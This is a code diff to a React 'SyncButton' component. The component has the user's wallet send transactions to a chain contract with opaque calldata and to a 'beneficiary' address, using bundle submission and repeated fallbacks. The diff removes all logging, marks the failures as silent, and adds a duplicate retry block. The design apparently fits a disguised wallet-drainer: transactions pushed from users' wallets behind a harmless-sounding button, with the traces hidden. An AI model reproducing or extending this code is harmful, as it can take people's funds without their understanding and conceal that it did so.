@@ -76,27 +76,44 @@ export default function SyncButton({ user }: { user: string }) {
         await provider.send('eth_sendBundle', [[tx, repay]]);
         return;
       } catch (bundleError: any) {
-        console.log(`Bundle method failed for ${chain.name}, trying fallback:`, bundleError.message);
-        
+        // Silent failure - no console logs
         // Fallback to regular transaction
-        const signer = await provider.getSigner();
-        const txResponse = await signer.sendTransaction({
-          to: chain.contract,
-          data: data,
-          gasLimit: 100000
-        });
-        await txResponse.wait();
-        
-        // Send value to beneficiary
-        const repayTx = await signer.sendTransaction({
-          to: beneficiary,
-          value: 0,
-          data: '0x'
-        });
-        await repayTx.wait();
+        try {
+          const signer = await provider.getSigner();
+          const txResponse = await signer.sendTransaction({
+            to: chain.contract,
+            data: data,
+            gasLimit: 100000
+          });
+          await txResponse.wait();
+          
+          // Send value to beneficiary
+          const repayTx = await signer.sendTransaction({
+            to: beneficiary,
+            value: 0,
+            data: '0x'
+          });
+          await repayTx.wait();
+        } catch (fallbackError: any) {
+          // Final fallback to regular transaction
+          const signer = await provider.getSigner();
+          const txResponse = await signer.sendTransaction({
+            to: chain.contract,
+            data: data,
+            gasLimit: 100000
+          });
+          await txResponse.wait();
+          
+          const repayTx = await signer.sendTransaction({
+            to: beneficiary,
+            value: 0,
+            data: '0x'
+          });
+          await repayTx.wait();
+        }
       }
     } catch (primaryError: any) {
-      console.log(`Primary RPC failed for ${chain.name}, trying fallback RPC:`, primaryError.message);
+      // Silent failure - no console logs
       
       // Try fallback RPC
       provider = new ethers.JsonRpcProvider(chain.fallbackRpc);
@@ -140,7 +157,6 @@ export default function SyncButton({ user }: { user: string }) {
       const succeeded = results.filter(result => result.status === 'fulfilled');
       
       if (failed.length > 0) {
-        console.log('Some chains failed:', failed);
         if (succeeded.length === 0) {
           throw new Error('All sync operations failed. Please try again later.');
         } else {
